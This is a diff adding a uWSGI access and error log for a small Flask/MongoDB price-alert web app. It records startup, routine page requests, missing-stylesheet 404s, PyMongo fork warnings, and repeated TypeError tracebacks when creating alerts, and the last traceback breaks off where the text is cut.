@@ -1,0 +1,280 @@
+*** Starting uWSGI 2.0.18 (64bit) on [Fri Sep 11 13:19:47 2020] ***
+compiled with version: 7.5.0 on 11 September 2020 11:42:39
+os: Linux-4.15.0-115-generic #116-Ubuntu SMP Wed Aug 26 14:04:49 UTC 2020
+nodename: deployment-learning-droplet
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/html/pricing-service
+detected binary path: /home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+your processes number limit is 3840
+your memory page size is 4096 bytes
+ *** WARNING: you have enabled harakiri without post buffering. Slow upload could be rejected on post-unbuffered webservers *** 
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /var/www/html/pricing-service/socket.sock fd 3
+Python version: 3.7.9 (default, Aug 18 2020, 06:22:45)  [GCC 7.5.0]
+PEP 405 virtualenv detected: /home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt
+Set PythonHome to /home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt
+Python main interpreter initialized at 0x559868413fa0
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 1313856 bytes (1283 KB) for 64 cores
+*** Operational MODE: preforking+threaded ***
+added /var/www/html/pricing-service/ to pythonpath.
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x559868413fa0 pid: 28714 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28714)
+spawned uWSGI worker 1 (pid: 28722, cores: 8)
+spawned uWSGI worker 2 (pid: 28723, cores: 8)
+spawned uWSGI worker 3 (pid: 28724, cores: 8)
+spawned uWSGI worker 4 (pid: 28725, cores: 8)
+spawned uWSGI worker 5 (pid: 28726, cores: 8)
+spawned uWSGI worker 6 (pid: 28727, cores: 8)
+spawned uWSGI worker 7 (pid: 28770, cores: 8)
+spawned uWSGI worker 8 (pid: 28771, cores: 8)
+[pid: 28771|app: 0|req: 1/1] 89.36.118.19 () {46 vars in 903 bytes} [Fri Sep 11 14:23:45 2020] GET / => generated 2460 bytes in 37 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 28771|app: 0|req: 2/2] 89.36.118.19 () {40 vars in 705 bytes} [Fri Sep 11 14:23:45 2020] GET /static/css/style.css => generated 232 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 28771|app: 0|req: 3/3] 89.36.118.19 () {42 vars in 845 bytes} [Fri Sep 11 14:23:54 2020] GET /users/register => generated 2774 bytes in 4 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 5)
+[pid: 28771|app: 0|req: 4/4] 89.36.118.19 () {40 vars in 719 bytes} [Fri Sep 11 14:23:54 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/pymongo/topology.py:150: UserWarning: MongoClient opened before fork. Create MongoClient only after forking. See PyMongo's documentation for details: http://api.mongodb.org/python/current/faq.html#is-pymongo-fork-safe
+  "MongoClient opened before fork. Create MongoClient only "
+[pid: 28771|app: 0|req: 5/5] 89.36.118.19 () {50 vars in 1041 bytes} [Fri Sep 11 14:24:13 2020] POST /users/register => generated 223 bytes in 76 msecs (HTTP/1.1 302) 5 headers in 256 bytes (1 switches on core 3)
+[pid: 28771|app: 0|req: 6/6] 89.36.118.19 () {46 vars in 977 bytes} [Fri Sep 11 14:24:14 2020] GET /alerts/ => generated 2204 bytes in 12 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 4)
+[pid: 28771|app: 0|req: 7/7] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 14:24:14 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 6)
+/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/pymongo/topology.py:150: UserWarning: MongoClient opened before fork. Create MongoClient only after forking. See PyMongo's documentation for details: http://api.mongodb.org/python/current/faq.html#is-pymongo-fork-safe
+  "MongoClient opened before fork. Create MongoClient only "
+[pid: 28727|app: 0|req: 1/8] 89.36.118.19 () {44 vars in 939 bytes} [Fri Sep 11 14:24:18 2020] GET /stores/ => generated 2125 bytes in 42 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 28771|app: 0|req: 8/9] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 14:24:19 2020] GET /static/css/style.css => generated 232 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 7)
+[pid: 28727|app: 0|req: 2/10] 89.36.118.19 () {44 vars in 947 bytes} [Fri Sep 11 14:24:23 2020] GET /users/login => generated 2574 bytes in 5 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 1)
+[pid: 28771|app: 0|req: 9/11] 89.36.118.19 () {42 vars in 817 bytes} [Fri Sep 11 14:24:23 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/pymongo/topology.py:150: UserWarning: MongoClient opened before fork. Create MongoClient only after forking. See PyMongo's documentation for details: http://api.mongodb.org/python/current/faq.html#is-pymongo-fork-safe
+  "MongoClient opened before fork. Create MongoClient only "
+[pid: 28722|app: 0|req: 1/12] 89.36.118.19 () {44 vars in 943 bytes} [Fri Sep 11 14:24:26 2020] GET /alerts/ => generated 2204 bytes in 35 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 28771|app: 0|req: 10/13] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 14:24:26 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 28771|app: 0|req: 11/14] 45.148.10.28 () {48 vars in 874 bytes} [Fri Sep 11 14:39:18 2020] POST /boaform/admin/formLogin => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 5)
+[pid: 28771|app: 0|req: 12/15] 89.36.118.19 () {46 vars in 974 bytes} [Fri Sep 11 14:46:07 2020] GET /alerts/ => generated 2204 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 5)
+[pid: 28771|app: 0|req: 13/16] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 14:46:07 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 28771|app: 0|req: 14/17] 89.36.118.19 () {44 vars in 939 bytes} [Fri Sep 11 14:46:09 2020] GET /stores/ => generated 2125 bytes in 9 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 4)
+[pid: 28771|app: 0|req: 15/18] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 14:46:09 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 6)
+[pid: 28724|app: 0|req: 1/19] 89.36.118.19 () {44 vars in 947 bytes} [Fri Sep 11 14:46:14 2020] GET /users/login => generated 2574 bytes in 16 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 28771|app: 0|req: 16/20] 89.36.118.19 () {42 vars in 817 bytes} [Fri Sep 11 14:46:14 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 7)
+[pid: 28722|app: 0|req: 2/21] 89.36.118.19 () {52 vars in 1133 bytes} [Fri Sep 11 14:46:17 2020] POST /users/login => generated 223 bytes in 45 msecs (HTTP/1.1 302) 5 headers in 256 bytes (1 switches on core 1)
+[pid: 28771|app: 0|req: 17/22] 89.36.118.19 () {46 vars in 974 bytes} [Fri Sep 11 14:46:17 2020] GET /alerts/ => generated 2204 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 0)
+[pid: 28722|app: 0|req: 3/23] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 14:46:17 2020] GET /static/css/style.css => generated 232 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 28771|app: 0|req: 18/24] 89.36.118.19 () {44 vars in 939 bytes} [Fri Sep 11 14:46:19 2020] GET /stores/ => generated 2125 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 1)
+[pid: 28724|app: 0|req: 2/25] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 14:46:19 2020] GET /static/css/style.css => generated 232 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 28771|app: 0|req: 19/26] 89.36.118.19 () {42 vars in 880 bytes} [Fri Sep 11 14:46:59 2020] GET / => generated 2460 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 2)
+[pid: 28724|app: 0|req: 3/27] 89.36.118.19 () {42 vars in 806 bytes} [Fri Sep 11 14:46:59 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (2 switches on core 2)
+[pid: 28771|app: 0|req: 20/28] 89.36.118.19 () {44 vars in 940 bytes} [Fri Sep 11 14:47:02 2020] GET /users/login => generated 2574 bytes in 4 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 5)
+[pid: 28771|app: 0|req: 21/29] 89.36.118.19 () {42 vars in 817 bytes} [Fri Sep 11 14:47:02 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/pymongo/topology.py:150: UserWarning: MongoClient opened before fork. Create MongoClient only after forking. See PyMongo's documentation for details: http://api.mongodb.org/python/current/faq.html#is-pymongo-fork-safe
+  "MongoClient opened before fork. Create MongoClient only "
+[pid: 28770|app: 0|req: 1/30] 89.36.118.19 () {52 vars in 1133 bytes} [Fri Sep 11 14:47:04 2020] POST /users/login => generated 223 bytes in 65 msecs (HTTP/1.1 302) 5 headers in 256 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 28771|app: 0|req: 22/31] 89.36.118.19 () {46 vars in 974 bytes} [Fri Sep 11 14:47:04 2020] GET /alerts/ => generated 2204 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 4)
+[pid: 28771|app: 0|req: 23/32] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 14:47:04 2020] GET /static/css/style.css => generated 232 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 6)
+[pid: 28771|app: 0|req: 24/33] 89.36.118.19 () {44 vars in 939 bytes} [Fri Sep 11 14:47:07 2020] GET /stores/ => generated 2125 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 7)
+[pid: 28726|app: 0|req: 1/34] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 14:47:07 2020] GET /static/css/style.css => generated 232 bytes in 9 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 28770|app: 0|req: 2/35] 89.36.118.19 () {44 vars in 947 bytes} [Fri Sep 11 14:47:11 2020] GET /users/login => generated 2574 bytes in 21 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 6)
+[pid: 28770|app: 0|req: 3/36] 89.36.118.19 () {42 vars in 817 bytes} [Fri Sep 11 14:47:11 2020] GET /static/css/style.css => generated 232 bytes in 3 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 7)
+[pid: 28770|app: 0|req: 4/37] 89.36.118.19 () {52 vars in 1133 bytes} [Fri Sep 11 14:47:25 2020] POST /users/login => generated 223 bytes in 53 msecs (HTTP/1.1 302) 5 headers in 256 bytes (1 switches on core 5)
+[pid: 28770|app: 0|req: 5/38] 89.36.118.19 () {46 vars in 974 bytes} [Fri Sep 11 14:47:26 2020] GET /alerts/ => generated 2204 bytes in 6 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 4)
+[pid: 28770|app: 0|req: 6/39] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 14:47:26 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 28722|app: 0|req: 4/40] 89.36.118.19 () {44 vars in 939 bytes} [Fri Sep 11 14:47:29 2020] GET /stores/ => generated 2125 bytes in 9 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 3)
+[pid: 28770|app: 0|req: 7/41] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 14:47:29 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/pymongo/topology.py:150: UserWarning: MongoClient opened before fork. Create MongoClient only after forking. See PyMongo's documentation for details: http://api.mongodb.org/python/current/faq.html#is-pymongo-fork-safe
+  "MongoClient opened before fork. Create MongoClient only "
+[pid: 28726|app: 0|req: 2/42] 89.36.118.19 () {44 vars in 939 bytes} [Fri Sep 11 14:47:44 2020] GET /alerts/ => generated 2204 bytes in 21 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 1)
+[pid: 28770|app: 0|req: 8/43] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 14:47:44 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 1)
+[pid: 28726|app: 0|req: 3/44] 89.36.118.19 () {44 vars in 945 bytes} [Fri Sep 11 14:47:45 2020] GET /alerts/new => generated 3255 bytes in 5 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 2)
+[pid: 28771|app: 0|req: 25/45] 89.36.118.19 () {42 vars in 816 bytes} [Fri Sep 11 14:47:45 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+[2020-09-11 14:48:40,835] ERROR in app: Exception on /alerts/new [POST]
+Traceback (most recent call last):
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 2311, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1834, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1737, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/_compat.py", line 36, in reraise
+    raise value
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1832, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1818, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/var/www/html/pricing-service/models/user/decorators.py", line 12, in decorated_function
+    return f(*args, **kwargs)
+  File "/var/www/html/pricing-service/views/alerts.py", line 24, in create_alert
+    store = Store.find_by_url(item_url)
+  File "/var/www/html/pricing-service/models/store.py", line 46, in find_by_url
+    return cls.get_by_url_prefix(url_prefix)
+  File "/var/www/html/pricing-service/models/store.py", line 34, in get_by_url_prefix
+    return cls.find_one_by("url_prefix", url_regex)
+  File "/var/www/html/pricing-service/models/model.py", line 36, in find_one_by
+    return cls(**Database.find_one(cls.collection, {attribute: value}))
+TypeError: ABCMeta object argument after ** must be a mapping, not NoneType
+[pid: 28771|app: 0|req: 26/46] 89.36.118.19 () {52 vars in 1132 bytes} [Fri Sep 11 14:48:40 2020] POST /alerts/new => generated 290 bytes in 5 msecs (HTTP/1.1 500) 2 headers in 84 bytes (1 switches on core 1)
+[2020-09-11 14:48:57,837] ERROR in app: Exception on /alerts/new [POST]
+Traceback (most recent call last):
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 2311, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1834, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1737, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/_compat.py", line 36, in reraise
+    raise value
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1832, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1818, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/var/www/html/pricing-service/models/user/decorators.py", line 12, in decorated_function
+    return f(*args, **kwargs)
+  File "/var/www/html/pricing-service/views/alerts.py", line 24, in create_alert
+    store = Store.find_by_url(item_url)
+  File "/var/www/html/pricing-service/models/store.py", line 46, in find_by_url
+    return cls.get_by_url_prefix(url_prefix)
+  File "/var/www/html/pricing-service/models/store.py", line 34, in get_by_url_prefix
+    return cls.find_one_by("url_prefix", url_regex)
+  File "/var/www/html/pricing-service/models/model.py", line 36, in find_one_by
+    return cls(**Database.find_one(cls.collection, {attribute: value}))
+TypeError: ABCMeta object argument after ** must be a mapping, not NoneType
+[pid: 28771|app: 0|req: 27/47] 89.36.118.19 () {52 vars in 1132 bytes} [Fri Sep 11 14:48:57 2020] POST /alerts/new => generated 290 bytes in 3 msecs (HTTP/1.1 500) 2 headers in 84 bytes (1 switches on core 2)
+[pid: 28771|app: 0|req: 28/48] 89.36.118.19 () {42 vars in 880 bytes} [Fri Sep 11 15:21:31 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 5)
+[pid: 28723|app: 0|req: 1/49] 89.36.118.19 () {42 vars in 806 bytes} [Fri Sep 11 15:21:31 2020] GET /static/css/style.css => generated 232 bytes in 7 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 0)
+announcing my loyalty to the Emperor...
+[pid: 28771|app: 0|req: 29/50] 89.36.118.19 () {44 vars in 940 bytes} [Fri Sep 11 15:21:34 2020] GET /users/login => generated 2574 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 3)
+[pid: 28722|app: 0|req: 5/51] 89.36.118.19 () {42 vars in 817 bytes} [Fri Sep 11 15:21:34 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 4)
+[pid: 28722|app: 0|req: 6/52] 89.36.118.19 () {52 vars in 1133 bytes} [Fri Sep 11 15:21:36 2020] POST /users/login => generated 223 bytes in 46 msecs (HTTP/1.1 302) 5 headers in 256 bytes (1 switches on core 5)
+[pid: 28771|app: 0|req: 30/53] 89.36.118.19 () {46 vars in 974 bytes} [Fri Sep 11 15:21:36 2020] GET /alerts/ => generated 2204 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 3)
+[pid: 28771|app: 0|req: 31/54] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 15:21:36 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 6)
+[pid: 28722|app: 0|req: 7/55] 89.36.118.19 () {44 vars in 939 bytes} [Fri Sep 11 15:21:39 2020] GET /stores/ => generated 2125 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 95 bytes (2 switches on core 6)
+[pid: 28722|app: 0|req: 8/56] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 15:21:40 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 7)
+[pid: 28722|app: 0|req: 9/57] 89.36.118.19 () {42 vars in 900 bytes} [Fri Sep 11 15:21:42 2020] GET /stores/new => generated 231 bytes in 2 msecs (HTTP/1.1 302) 5 headers in 360 bytes (1 switches on core 0)
+[pid: 28722|app: 0|req: 10/58] 89.36.118.19 () {42 vars in 1002 bytes} [Fri Sep 11 15:21:42 2020] GET /users/login => generated 2791 bytes in 4 msecs (HTTP/1.1 200) 4 headers in 213 bytes (1 switches on core 1)
+[pid: 28771|app: 0|req: 32/59] 89.36.118.19 () {42 vars in 817 bytes} [Fri Sep 11 15:21:42 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 7)
+[pid: 28771|app: 0|req: 33/60] 89.36.118.19 () {52 vars in 1133 bytes} [Fri Sep 11 15:23:39 2020] POST /users/login => generated 223 bytes in 27 msecs (HTTP/1.1 302) 5 headers in 256 bytes (1 switches on core 0)
+[pid: 28771|app: 0|req: 34/61] 89.36.118.19 () {46 vars in 974 bytes} [Fri Sep 11 15:23:39 2020] GET /alerts/ => generated 2204 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 1)
+[pid: 28722|app: 0|req: 11/62] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 15:23:39 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 2)
+[pid: 28722|app: 0|req: 12/63] 89.36.118.19 () {42 vars in 900 bytes} [Fri Sep 11 15:23:48 2020] GET /stores/new => generated 231 bytes in 2 msecs (HTTP/1.1 302) 5 headers in 360 bytes (1 switches on core 3)
+[pid: 28727|app: 0|req: 3/64] 89.36.118.19 () {42 vars in 1002 bytes} [Fri Sep 11 15:23:48 2020] GET /users/login => generated 2791 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 213 bytes (1 switches on core 2)
+[pid: 28727|app: 0|req: 4/65] 89.36.118.19 () {42 vars in 817 bytes} [Fri Sep 11 15:23:48 2020] GET /static/css/style.css => generated 232 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 28770|app: 0|req: 9/66] 89.36.118.19 () {44 vars in 943 bytes} [Fri Sep 11 15:23:55 2020] GET /alerts/ => generated 2204 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 0)
+[pid: 28724|app: 0|req: 4/67] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 15:23:55 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 3)
+[pid: 28771|app: 0|req: 35/68] 89.36.118.19 () {44 vars in 945 bytes} [Fri Sep 11 15:23:55 2020] GET /alerts/new => generated 3255 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 2)
+[pid: 28771|app: 0|req: 36/69] 89.36.118.19 () {42 vars in 816 bytes} [Fri Sep 11 15:23:56 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 5)
+[2020-09-11 15:24:17,104] ERROR in app: Exception on /alerts/new [POST]
+Traceback (most recent call last):
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 2311, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1834, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1737, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/_compat.py", line 36, in reraise
+    raise value
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1832, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 1818, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/var/www/html/pricing-service/models/user/decorators.py", line 12, in decorated_function
+    return f(*args, **kwargs)
+  File "/var/www/html/pricing-service/views/alerts.py", line 24, in create_alert
+    store = Store.find_by_url(item_url)
+  File "/var/www/html/pricing-service/models/store.py", line 46, in find_by_url
+    return cls.get_by_url_prefix(url_prefix)
+  File "/var/www/html/pricing-service/models/store.py", line 34, in get_by_url_prefix
+    return cls.find_one_by("url_prefix", url_regex)
+  File "/var/www/html/pricing-service/models/model.py", line 36, in find_one_by
+    return cls(**Database.find_one(cls.collection, {attribute: value}))
+TypeError: ABCMeta object argument after ** must be a mapping, not NoneType
+[pid: 28771|app: 0|req: 37/70] 89.36.118.19 () {52 vars in 1132 bytes} [Fri Sep 11 15:24:17 2020] POST /alerts/new => generated 290 bytes in 4 msecs (HTTP/1.1 500) 2 headers in 84 bytes (1 switches on core 4)
+[pid: 28771|app: 0|req: 38/71] 196.52.43.106 () {30 vars in 429 bytes} [Fri Sep 11 15:31:18 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 3)
+[pid: 28771|app: 0|req: 39/72] 89.36.118.19 () {42 vars in 880 bytes} [Fri Sep 11 15:38:30 2020] GET / => generated 2460 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 3)
+[pid: 28770|app: 0|req: 10/73] 89.36.118.19 () {42 vars in 806 bytes} [Fri Sep 11 15:38:30 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 6)
+[pid: 28770|app: 0|req: 11/74] 89.36.118.19 () {44 vars in 946 bytes} [Fri Sep 11 15:38:32 2020] GET /users/register => generated 2774 bytes in 3 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 7)
+[pid: 28770|app: 0|req: 12/75] 89.36.118.19 () {42 vars in 820 bytes} [Fri Sep 11 15:38:32 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 5)
+[pid: 28770|app: 0|req: 13/76] 89.36.118.19 () {44 vars in 954 bytes} [Fri Sep 11 15:38:35 2020] GET /users/login => generated 2574 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 4)
+[pid: 28724|app: 0|req: 5/77] 89.36.118.19 () {42 vars in 817 bytes} [Fri Sep 11 15:38:35 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 4)
+[pid: 28727|app: 0|req: 5/78] 89.36.118.19 () {52 vars in 1133 bytes} [Fri Sep 11 15:38:37 2020] POST /users/login => generated 223 bytes in 28 msecs (HTTP/1.1 302) 5 headers in 256 bytes (1 switches on core 4)
+[pid: 28771|app: 0|req: 40/79] 89.36.118.19 () {46 vars in 974 bytes} [Fri Sep 11 15:38:37 2020] GET /alerts/ => generated 2204 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 3)
+[pid: 28724|app: 0|req: 6/80] 89.36.118.19 () {42 vars in 813 bytes} [Fri Sep 11 15:38:37 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 5)
+[pid: 28724|app: 0|req: 7/81] 89.36.118.19 () {44 vars in 945 bytes} [Fri Sep 11 15:38:40 2020] GET /alerts/new => generated 3255 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 95 bytes (1 switches on core 6)
+[pid: 28770|app: 0|req: 14/82] 89.36.118.19 () {42 vars in 816 bytes} [Fri Sep 11 15:38:40 2020] GET /static/css/style.css => generated 232 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 72 bytes (1 switches on core 4)
+/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/pymongo/topology.py:150: UserWarning: MongoClient opened before fork. Create MongoClient only after forking. See PyMongo's documentation for details: http://api.mongodb.org/python/current/faq.html#is-pymongo-fork-safe
+  "MongoClient opened before fork. Create MongoClient only "
+[2020-09-11 15:38:51,875] ERROR in app: Exception on /alerts/new [POST]
+Traceback (most recent call last):
+  File "/home/gareth/.local/share/virtualenvs/pricing-service-inAv0XFt/lib/python3.7/site-packages/flask/app.py", line 2311, in wsgi_app
